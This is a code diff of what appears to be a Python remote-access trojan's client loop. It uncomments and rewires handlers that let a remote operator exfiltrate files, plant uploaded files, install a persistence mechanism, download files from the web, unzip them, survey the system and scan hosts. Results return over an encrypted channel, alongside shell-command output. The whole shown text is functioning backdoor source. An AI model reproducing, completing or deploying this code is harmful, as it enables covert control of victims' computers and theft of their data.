@@ -12,7 +12,6 @@ import subprocess
 import sys
 
 from core import crypto
-from core import filesock
 from core import persistence
 from core import scan
 from core import survey
@@ -51,52 +50,52 @@ def main():
             results = results.stdout.read() + results.stderr.read()
             client.sendGCM(results)
 
-        # # send file
-        # elif cmd == 'download':
-        #     for fname in action.split():
-        #         fname = fname.strip()
-        #         if not os.path.isfile(fname):
-        #             continue
+        # send file
+        elif cmd == 'download':
+            for fname in action.split():
+                fname = fname.strip()
+                if not os.path.isfile(fname):
+                    continue
 
-        #         filesock.sendfile(s, GCM, IV, fname)
+                client.sendfile(fname)
 
-        # # receive file
-        # elif cmd == 'upload':
-        #     for fname in action.split():
-        #         fname = fname.strip()
-        #         if os.path.isfile(fname):
-        #             continue
+        # receive file
+        elif cmd == 'upload':
+            for fname in action.split():
+                fname = fname.strip()
+                if os.path.isfile(fname):
+                    continue
 
-        #         filesock.recvfile(s, GCM, fname)
+                client.recvfile(fname)
 
         # # regenerate DH key
         # elif cmd == 'rekey':
         #     dh_key = crypto.diffiehellman(s)
 
-        # # apply persistence mechanism
-        # elif cmd == 'persistence':
-        #     results = persistence.run(PLAT)
-        #     crypto.sendGCM(s, GCM, IV, results)
+        # apply persistence mechanism
+        elif cmd == 'persistence':
+            results = persistence.run(PLAT)
+            client.sendGCM(results)
 
-        # # download a file from the web
-        # elif cmd == 'wget':
-        #     results = toolkit.wget(action)
-        #     crypto.sendGCM(s, GCM, IV, results)
+        # download a file from the web
+        elif cmd == 'wget':
+            results = toolkit.wget(action)
+            client.sendGCM(results)
 
-        # # unzip a file
-        # elif cmd == 'unzip':
-        #     results = toolkit.unzip(action)
-        #     crypto.sendGCM(s, GCM, IV, results)
+        # unzip a file
+        elif cmd == 'unzip':
+            results = toolkit.unzip(action)
+            client.sendGCM(results)
 
-        # # run system survey
-        # elif cmd == 'survey':
-        #     results = survey.run(PLAT)
-        #     crypto.sendGCM(s, GCM, IV, results)
+        # run system survey
+        elif cmd == 'survey':
+            results = survey.run(PLAT)
+            client.sendGCM(results)
 
-        # # run a scan
-        # elif cmd == 'scan':
-        #     results = scan.single_host(action)
-        #     crypto.sendGCM(s, GCM, IV, results)
+        # run a scan
+        elif cmd == 'scan':
+            results = scan.single_host(action)
+            client.sendGCM(results)
 
 
 if __name__ == '__main__':
